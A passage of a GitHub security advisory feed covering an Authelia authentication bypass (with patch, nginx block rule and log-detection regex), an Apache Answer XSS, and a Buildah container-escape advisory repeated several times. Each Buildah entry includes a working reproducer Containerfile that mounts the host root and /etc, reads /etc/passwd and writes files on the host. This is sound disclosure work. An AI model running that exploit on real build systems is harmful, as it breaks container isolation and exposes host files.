<li><a href="https://github.com/authelia/authelia/blob/v4.37.5/internal/handlers/handler_verify.go#L376-L394">https://github.com/authelia/authelia/blob/v4.37.5/internal/handlers/handler_verify.go#L376-L394</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/authelia/authelia/security/advisories/GHSA-x883-2vmg-xwf7">https://github.com/authelia/authelia/security/advisories/GHSA-x883-2vmg-xwf7</a></li>
<li><a href="https://github.com/authelia/authelia/blob/v4.37.5/internal/handlers/handler_verify.go#L376-L394">https://github.com/authelia/authelia/blob/v4.37.5/internal/handlers/handler_verify.go#L376-L394</a></li>
<li><a href="https://github.com/advisories/GHSA-x883-2vmg-xwf7">https://github.com/advisories/GHSA-x883-2vmg-xwf7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x883-2vmg-xwf7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-04-22T15:52:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/apache/incubator-answer] Apache Answer: XSS vulnerability when changing personal website]]></title>
        <id>https://github.com/advisories/GHSA-cvqr-mwh6-2vc6</id>
        <link href="https://github.com/advisories/GHSA-cvqr-mwh6-2vc6"/>
        <updated>2024-04-22T15:52:28.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'/<code>XSS</code>) vulnerability in Apache Answer.This issue affects Apache Answer: before 1.3.0.</p>
<p>XSS attack when user changes personal website. A logged-in user, when modifying their personal website, can input malicious code in the website to create such an attack.
Users are recommended to upgrade to version [1.3.0], which fixes the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29217">https://nvd.nist.gov/vuln/detail/CVE-2024-29217</a></li>
<li><a href="https://lists.apache.org/thread/nc0g1borr0d3wx25jm39pn7nyf268n0x">https://lists.apache.org/thread/nc0g1borr0d3wx25jm39pn7nyf268n0x</a></li>
<li><a href="https://github.com/advisories/GHSA-cvqr-mwh6-2vc6">https://github.com/advisories/GHSA-cvqr-mwh6-2vc6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cvqr-mwh6-2vc6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-21T18:30:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/authelia/authelia/v4] Authelia vulnerable to an authentication bypassed with malformed request URI on nginx]]></title>
        <id>https://github.com/advisories/GHSA-68wm-pfjf-wqp6</id>
        <link href="https://github.com/advisories/GHSA-68wm-pfjf-wqp6"/>
        <updated>2024-04-22T14:49:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This affects uses who are using nginx ngx_http_auth_request_module with Authelia, it allows a malicious individual who crafts a malformed HTTP request to bypass the authentication mechanism. It additionally could theoretically affect other proxy servers, but all of the ones we officially support except nginx do not allow malformed URI paths.</p>
<h3 id="patches">Patches</h3>
<p>The problem is rectified entirely in v4.29.3. As this patch is relatively straightforward we can back port this to any version upon request. Alternatively we are supplying a git patch to 4.25.1 which should be relatively straightforward to apply to any version, the git patches for specific versions can be found below.</p>
<details><summary>Patch for 4.25.1:</summary><p>

</p><pre><code class="language-patch">From ca22f3d2c44ca7bef043ffbeeb06d6659c1d550f Mon Sep 17 00:00:00 2001
From: James Elliott &lt;james-d-elliott@users.noreply.github.com&gt;
Date: Wed, 19 May 2021 12:10:13 +1000
Subject: [PATCH] fix(handlers): verify returns 200 on malformed request

This is a git patch for commit at tag v4.25.1 to address a potential method to bypass authentication in proxies that forward malformed information to Authelia in the forward auth process. Instead of returning a 200 this ensures that Authelia returns a 401 when this occurs.
---
 internal/handlers/handler_verify.go | 4 +++-
 1 file changed, 3 insertions(+), 1 deletion(-)

diff --git a/internal/handlers/handler_verify.go b/internal/handlers/handler_verify.go
index 65c064ce..4dd9702d 100644
--- a/internal/handlers/handler_verify.go
+++ b/internal/handlers/handler_verify.go
@@ -396,7 +396,9 @@ func VerifyGet(cfg schema.AuthenticationBackendConfiguration) middlewares.Reques
         targetURL, err := getOriginalURL(ctx)
 
         if err != nil {
-			ctx.Error(fmt.Errorf("Unable to parse target URL: %s", err), operationFailedMessage)
+			ctx.Logger.Error(fmt.Errorf("Unable to parse target URL: %s", err))
+			ctx.ReplyUnauthorized()
+
             return
         }
 
-- 
2.31.1
</code></pre>
<p></p></details>

<h3 id="workarounds">Workarounds</h3>
<p>The most relevant workaround is upgrading. <strong>If you need assistance with an upgrade please contact us on <a href="https://riot.im/app/#/room/#authelia:matrix.org">Matrix</a> or <a href="https://discord.authelia.com">Discord</a>.</strong> Please just let us know you're needing help upgrading to above 4.29.2. </p>
<p>You can add an block which fails requests that contains a malformed URI in the internal location block. We have crafted one that should work in most instances, it basically checks no chars that are required to be URL-encoded for either the path or the query are in the URI. Basically this regex checks that the characters between the square braces are the only characters in the $request_uri header, if they exist, it returns a HTTP 401 status code. The characters in the regex match are tested to not cause a parsing error that would result in a failure, however they are not exhaustive since query strings seem to not always conform to the RFC.</p>
<details><summary>authelia.conf:</summary><p>

</p><pre><code class="language-nginx">location /authelia {
    internal;
    # **IMPORTANT**
    # This block rejects requests with a 401 which contain characters that are unable to be parsed.
    # It is necessary for security prior to v4.29.3 due to the fact we returned an invalid code in the event of a parser error.
    # You may comment this section if you're using Authelia v4.29.3 or above. We strongly recommend upgrading.
    # RFC3986: http://tools.ietf.org/html/rfc3986
    # Commentary on RFC regarding Query Strings: https://www.456bereastreet.com/archive/201008/what_characters_are_allowed_unencoded_in_query_strings/
    if ($request_uri ~ [^a-zA-Z0-9_+-=\!@$%&amp;*?~.:#'\;\(\)\[\]]) {
        return 401;
    }

    # Include the remainder of the block here. 
}
</code></pre>
<p></p></details>

<h3 id="discovery">Discovery</h3>
<p>This issue was discovered by:</p>
<p>Siemens Energy
Cybersecurity Red Team</p>
<ul>
<li>Silas Francisco</li>
<li>Ricardo Pesqueira</li>
</ul>
<h3 id="identifying-active-exploitation-of-the-vulnerability">Identifying active exploitation of the vulnerability</h3>
<p>The following regex should match log entries that are an indication of the vulnerability being exploited:</p>
<pre><code class="language-regex">level=error msg="Unable to parse target URL: Unable to parse URL (extracted from X-Original-URL header)?.*?: parse.*?net/url:.*github\.com/authelia/authelia/internal/handlers/handler_verify\.go
</code></pre>
<p>Example log entry <em><strong>with</strong></em> X-Original-URL configured:</p>
<pre><code class="language-log">time="2021-05-21T16:31:15+10:00" level=error msg="Unable to parse target URL: Unable to parse URL extracted from X-Original-URL header: parse \"https://example.com/": net/url: invalid control character in URL" method=GET path=/api/verify remote_ip=192.168.1.10 stack="github.com/authelia/authelia/internal/middlewares/authelia_context.go:65 (*AutheliaCtx).Error\ngithub.com/authelia/authelia/internal/handlers/handler_verify.go:431     VerifyGet.func1\ngithub.com/authelia/authelia/internal/middlewares/authelia_context.go:50 AutheliaMiddleware.func1.1\ngithub.com/fasthttp/router@v1.3.12/router.go:414                         (*Router).Handler\ngithub.com/authelia/authelia/internal/middlewares/log_request.go:14      LogRequestMiddleware.func1\ngithub.com/valyala/fasthttp@v1.24.0/server.go:2219                       (*Server).serveConn\ngithub.com/valyala/fasthttp@v1.24.0/workerpool.go:223                    (*workerPool).workerFunc\ngithub.com/valyala/fasthttp@v1.24.0/workerpool.go:195                    (*workerPool).getCh.func1\nruntime/asm_amd64.s:1371                                                 goexit"
</code></pre>
<p>Example log entry <em><strong>without</strong></em> X-Original-URL configured:</p>
<pre><code class="language-log">time="2021-05-21T16:30:17+10:00" level=error msg="Unable to parse target URL: Unable to parse URL https://example.com/: parse \"https://example.com/": net/url: invalid control character in URL" method=GET path=/api/verify remote_ip=192.168.1.10 stack="github.com/authelia/authelia/internal/middlewares/authelia_context.go:65 (*AutheliaCtx).Error\ngithub.com/authelia/authelia/internal/handlers/handler_verify.go:431     VerifyGet.func1\ngithub.com/authelia/authelia/internal/middlewares/authelia_context.go:50 AutheliaMiddleware.func1.1\ngithub.com/fasthttp/router@v1.3.12/router.go:414                         (*Router).Handler\ngithub.com/authelia/authelia/internal/middlewares/log_request.go:14      LogRequestMiddleware.func1\ngithub.com/valyala/fasthttp@v1.24.0/server.go:2219                       (*Server).serveConn\ngithub.com/valyala/fasthttp@v1.24.0/workerpool.go:223                    (*workerPool).workerFunc\ngithub.com/valyala/fasthttp@v1.24.0/workerpool.go:195                    (*workerPool).getCh.func1\nruntime/asm_amd64.s:1371                                                 goexit"
</code></pre>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open a <a href="https://github.com/authelia/authelia/discussions">Discussion</a></li>
<li>Email us at <a href="mailto:security@authelia.com">security@authelia.com</a></li>
</ul>
<h3 id="edit--adjustment">Edit / Adjustment</h3>
<p>This CVE has been edited adjusting the score to more accurately reflect the guidance in the <a href="https://www.first.org/cvss/specification-document">official CVSS 3.1 guide</a>. Due to misunderstandings about the CVSS indicators this was incorrectly assigned but this has been corrected. Under close evaluation the score we originally assigned to this CVE is inappropriate in two clearly identifiable criteria:</p>
<ul>
<li>Complexity (Low -&gt; High): This attack requires the administrator be using NGINX's auth_request module. This means the attack cannot be exploited at will but rather requires a pre-condition separate to the vulnerable system outside of the attackers control (a vulnerable version of NGINX - at the time of this writing NGINX's security team has <em>refused</em> to fix the clear bug on their end but that's effectively irrelevant since we operate with more than just a NGINX proxy and no other proxy has this vulnerability), and requires the attacker have gathered knowledge about the system for this likely to be exploited.</li>
<li>Availability (High -&gt; None): This attack does not alter availability directly.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/authelia/authelia/security/advisories/GHSA-68wm-pfjf-wqp6">https://github.com/authelia/authelia/security/advisories/GHSA-68wm-pfjf-wqp6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-32637">https://nvd.nist.gov/vuln/detail/CVE-2021-32637</a></li>
<li><a href="https://github.com/authelia/authelia/commit/c62dbd43d6e69ae81530e7c4f8763857f8ff1dda">https://github.com/authelia/authelia/commit/c62dbd43d6e69ae81530e7c4f8763857f8ff1dda</a></li>
<li><a href="https://github.com/advisories/GHSA-68wm-pfjf-wqp6">https://github.com/advisories/GHSA-68wm-pfjf-wqp6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-68wm-pfjf-wqp6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2021-12-20T16:57:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] Container escape at build time]]></title>
        <id>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</id>
        <link href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf"/>
        <updated>2024-04-20T05:05:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>
<h3 id="patches">Patches</h3>
<p>From @nalind </p>
<pre><code># cat /root/cve-2024-1753.diff
--- internal/volumes/volumes.go
+++ internal/volumes/volumes.go
@@ -11,6 +11,7 @@ import (
 
     "errors"
 
+	"github.com/containers/buildah/copier"
     "github.com/containers/buildah/define"
     "github.com/containers/buildah/internal"
     internalParse "github.com/containers/buildah/internal/parse"
@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st
     // buildkit parity: support absolute path for sources from current build context
     if contextDir != "" {
         // path should be /contextDir/specified path
-		newMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))
+		evaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})
+		if err != nil {
+			return newMount, "", err
+		}
+		newMount.Source = evaluated
     } else {
         // looks like its coming from `build run --mount=type=bind` allow using absolute path
         // error out if no source is set
</code></pre>
<h3 id="reproducer">Reproducer</h3>
<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>
<p>Use the following Containerfile</p>
<pre><code># cat ~/cve_Containerfile
FROM alpine as base

RUN ln -s / /rootdir
RUN ln -s /etc /etc2

FROM alpine

RUN echo "ls container root"
RUN ls -l /

RUN echo "With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host"
RUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit

RUN echo "With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host"
RUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 
</code></pre>
<h4 id="to-test">To Test</h4>
<h5 id="testing-with-an-older-version-of-buildah-with-the-issue">Testing with an older version of Buildah with the issue</h5>
<pre><code>setenforce 0
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>
<pre><code>buildah rm -a
buildah rmi -a
rm /BIND_BREAKOUT
rm /etc/BIND_BREAKOUT2
setenforce 1
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>
<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>
<h5 id="testing-with-the-patch">Testing with the patch</h5>
<p>Use the same commands as testing with an older version of Buildah.</p>
<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>
<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With "setenforce 0" set, which is not at all advised, the root file system is open for modification with this exploit.  With "setenfoce 1" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>
<h3 id="references">References</h3>
<p>Unknown.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>
<li><a href="https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>
<li><a href="https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>
<li><a href="https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2265513">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1753">https://nvd.nist.gov/vuln/detail/CVE-2024-1753</a></li>
<li><a href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-19T20:06:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] Container escape at build time]]></title>
        <id>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</id>
        <link href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf"/>
        <updated>2024-04-20T05:05:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>
<h3 id="patches">Patches</h3>
<p>From @nalind </p>
<pre><code># cat /root/cve-2024-1753.diff
--- internal/volumes/volumes.go
+++ internal/volumes/volumes.go
@@ -11,6 +11,7 @@ import (
 
     "errors"
 
+	"github.com/containers/buildah/copier"
     "github.com/containers/buildah/define"
     "github.com/containers/buildah/internal"
     internalParse "github.com/containers/buildah/internal/parse"
@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st
     // buildkit parity: support absolute path for sources from current build context
     if contextDir != "" {
         // path should be /contextDir/specified path
-		newMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))
+		evaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})
+		if err != nil {
+			return newMount, "", err
+		}
+		newMount.Source = evaluated
     } else {
         // looks like its coming from `build run --mount=type=bind` allow using absolute path
         // error out if no source is set
</code></pre>
<h3 id="reproducer">Reproducer</h3>
<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>
<p>Use the following Containerfile</p>
<pre><code># cat ~/cve_Containerfile
FROM alpine as base

RUN ln -s / /rootdir
RUN ln -s /etc /etc2

FROM alpine

RUN echo "ls container root"
RUN ls -l /

RUN echo "With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host"
RUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit

RUN echo "With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host"
RUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 
</code></pre>
<h4 id="to-test">To Test</h4>
<h5 id="testing-with-an-older-version-of-buildah-with-the-issue">Testing with an older version of Buildah with the issue</h5>
<pre><code>setenforce 0
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>
<pre><code>buildah rm -a
buildah rmi -a
rm /BIND_BREAKOUT
rm /etc/BIND_BREAKOUT2
setenforce 1
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>
<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>
<h5 id="testing-with-the-patch">Testing with the patch</h5>
<p>Use the same commands as testing with an older version of Buildah.</p>
<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>
<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With "setenforce 0" set, which is not at all advised, the root file system is open for modification with this exploit.  With "setenfoce 1" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>
<h3 id="references">References</h3>
<p>Unknown.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>
<li><a href="https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>
<li><a href="https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>
<li><a href="https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2265513">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1753">https://nvd.nist.gov/vuln/detail/CVE-2024-1753</a></li>
<li><a href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-19T20:06:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] Container escape at build time]]></title>
        <id>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</id>
        <link href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf"/>
        <updated>2024-04-20T05:05:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>
<h3 id="patches">Patches</h3>
<p>From @nalind </p>
<pre><code># cat /root/cve-2024-1753.diff
--- internal/volumes/volumes.go
+++ internal/volumes/volumes.go
@@ -11,6 +11,7 @@ import (
 
     "errors"
 
+	"github.com/containers/buildah/copier"
     "github.com/containers/buildah/define"
     "github.com/containers/buildah/internal"
     internalParse "github.com/containers/buildah/internal/parse"
@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st
     // buildkit parity: support absolute path for sources from current build context
     if contextDir != "" {
         // path should be /contextDir/specified path
-		newMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))
+		evaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})
+		if err != nil {
+			return newMount, "", err
+		}
+		newMount.Source = evaluated
     } else {
         // looks like its coming from `build run --mount=type=bind` allow using absolute path
         // error out if no source is set
</code></pre>
<h3 id="reproducer">Reproducer</h3>
<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>
<p>Use the following Containerfile</p>
<pre><code># cat ~/cve_Containerfile
FROM alpine as base

RUN ln -s / /rootdir
RUN ln -s /etc /etc2

FROM alpine

RUN echo "ls container root"
RUN ls -l /

RUN echo "With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host"
RUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit

RUN echo "With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host"
RUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 
</code></pre>
<h4 id="to-test">To Test</h4>
<h5 id="testing-with-an-older-version-of-buildah-with-the-issue">Testing with an older version of Buildah with the issue</h5>
<pre><code>setenforce 0
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>
<pre><code>buildah rm -a
buildah rmi -a
rm /BIND_BREAKOUT
rm /etc/BIND_BREAKOUT2
setenforce 1
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>
<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>
<h5 id="testing-with-the-patch">Testing with the patch</h5>
<p>Use the same commands as testing with an older version of Buildah.</p>
<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>
<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With "setenforce 0" set, which is not at all advised, the root file system is open for modification with this exploit.  With "setenfoce 1" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>
<h3 id="references">References</h3>
<p>Unknown.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>
<li><a href="https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>
<li><a href="https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>
<li><a href="https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2265513">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1753">https://nvd.nist.gov/vuln/detail/CVE-2024-1753</a></li>
<li><a href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-19T20:06:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] Container escape at build time]]></title>
        <id>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</id>
        <link href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf"/>
        <updated>2024-04-20T05:05:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>
<h3 id="patches">Patches</h3>
<p>From @nalind </p>
<pre><code># cat /root/cve-2024-1753.diff
--- internal/volumes/volumes.go
+++ internal/volumes/volumes.go
@@ -11,6 +11,7 @@ import (
 
     "errors"
 
+	"github.com/containers/buildah/copier"
